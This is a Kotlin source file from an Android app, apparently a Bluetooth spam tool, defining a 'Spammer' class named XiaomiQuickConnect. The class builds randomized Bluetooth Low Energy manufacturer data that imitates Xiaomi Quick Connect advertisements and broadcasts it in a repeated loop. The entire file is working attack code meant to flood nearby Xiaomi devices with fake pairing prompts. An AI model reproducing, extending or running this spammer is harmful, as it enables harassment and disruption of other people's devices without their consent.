package com.droid.dolphy

import android.bluetooth.le.AdvertiseData
import java.util.concurrent.ExecutorService
import java.util.concurrent.Executors
import kotlin.random.Random

class XiaomiQuickConnect : Spammer {
    private var blinkRunnable: Runnable? = null

    private var _isSpamming = false
    private var loop = 0
    private val executor: ExecutorService = Executors.newSingleThreadExecutor()

    companion object {
        private const val COMPANY_ID = 0x038F

        private fun generateManufacturerData(
            controlled: Boolean = false,
            byte1Options: List<String>? = null,
            byte2Options: List<String>? = null,
            valueRange: IntRange = 0x0320..0x0350
        ): Pair<String, ByteArray> {
            val prefix = "160120"
            val middle = "170A00000000885011B1FF"
            val suffix = "000000000000"

            fun normalizeByteStr(s: String): String {
                val up = s.uppercase().trim()
                require(up.length == 2 && up.matches(Regex("[0-9A-F]{2}"))) {
                    "Byte option must be 2 hex chars: $s"
                }
                return up
            }

            val rnd = Random.Default

            val byte1 = if (controlled && !byte1Options.isNullOrEmpty()) {
                normalizeByteStr(byte1Options.random())
            } else {
                String.format("%02X", rnd.nextInt(0x00, 0x100))
            }

            val byte2 = if (controlled && !byte2Options.isNullOrEmpty()) {
                normalizeByteStr(byte2Options.random())
            } else {
                String.format("%02X", rnd.nextInt(0x00, 0x100))
            }

            val safeRange = if (valueRange.first < 0x0000) 0x0000..valueRange.last else valueRange
            val valueMin = safeRange.first
            val valueMax = safeRange.last
            require(valueMin in 0x0000..0xFFFF && valueMax in 0x0000..0xFFFF && valueMin <= valueMax) {
                "valueRange must be within 0x0000..0xFFFF and first <= last"
            }

            val valueInt = if (controlled) {
                rnd.nextInt(valueMin, valueMax + 1)
            } else {
                rnd.nextInt(0x0000, 0x10000)
            }
            val value = String.format("%04X", valueInt)

            val hexString = (prefix + byte1 + byte2 + middle + value + suffix).uppercase()

            require(hexString.length % 2 == 0 && hexString.matches(Regex("[0-9A-F]+"))) {
                throw IllegalStateException("Generated hex is invalid: $hexString")
            }

            val bytes = ByteArray(hexString.length / 2)
            for (i in bytes.indices) {
                val hexByte = hexString.substring(i * 2, i * 2 + 2)
                bytes[i] = hexByte.toInt(16).toByte()
            }

            return Pair(hexString, bytes)
        }

        fun generateManufacturerDataBytes(controlled: Boolean = true): Pair<String, ByteArray> {
            val defaultByte1Options = listOf("A1")
            val defaultByte2Options = listOf("42", "4E")
            val defaultRange = 0x0320..0x0350

            return generateManufacturerData(
                controlled = controlled,
                byte1Options = defaultByte1Options,
                byte2Options = defaultByte2Options,
                valueRange = defaultRange
            )
        }
    }

    override fun start() {
        executor.execute {
            val bluetoothAdvertiser = BluetoothAdvertiser()
            _isSpamming = true
            loop = 0

            while (loop <= Helper.MAX_LOOP && _isSpamming) {
                val (hex, bytes) = Companion.generateManufacturerDataBytes(controlled = true)

                val data = AdvertiseData.Builder()
                    .addManufacturerData(COMPANY_ID, bytes)
                    .build()

                bluetoothAdvertiser.advertise(data, null)
                com.droid.dolphy.trackBlePackets(1)

                try {
                    Thread.sleep(Helper.delay.toLong())
                } catch (e: InterruptedException) {
                    Thread.currentThread().interrupt()
                    return@execute
                }

                bluetoothAdvertiser.stopAdvertising()
                loop++
            }
            _isSpamming = false
        }
    }

    override fun isSpamming(): Boolean = _isSpamming

    override fun stop() {
        _isSpamming = false
    }

    override fun setBlinkRunnable(blinkRunnable: Runnable?) {
        this.blinkRunnable = blinkRunnable
    }

    override fun getBlinkRunnable(): Runnable? {
        return blinkRunnable
    }
}

